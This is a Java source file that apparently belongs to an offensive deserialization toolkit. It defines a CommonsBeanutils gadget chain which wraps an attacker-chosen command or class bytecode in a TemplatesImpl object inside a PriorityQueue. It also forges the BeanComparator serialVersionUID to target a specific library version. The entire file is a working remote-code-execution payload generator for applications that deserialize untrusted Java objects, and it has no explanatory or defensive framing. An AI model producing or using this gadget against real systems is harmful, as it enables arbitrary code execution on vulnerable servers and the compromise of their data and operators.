package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.core.generator.TemplatesBytecodeGenerator;
import com.xyuxu.javasec.utils.Reflections;
import com.xyuxu.javasec.utils.Serializer;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

public class CommonsBeanutilsString_192 implements ObjectPayload<Object>, BytecodePayload<Object> {

    @Override
    public Object getObject(final String command) throws Exception {
        Serializer.hackSerialVersionUID(BeanComparator.class, -2044202215314119608L);
        final Object templates = TemplatesBytecodeGenerator.createTemplatesImpl(command);
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }

    @Override
    public Object getObjectWithBytecode(byte[] classBytes) throws Exception {

        Serializer.hackSerialVersionUID(BeanComparator.class, -2044202215314119608L);
        final Object templates = TemplatesBytecodeGenerator.createTemplatesImplWithBytecode(classBytes);
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        queue.add("1");
        queue.add("1");
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});
        return queue;
    }
}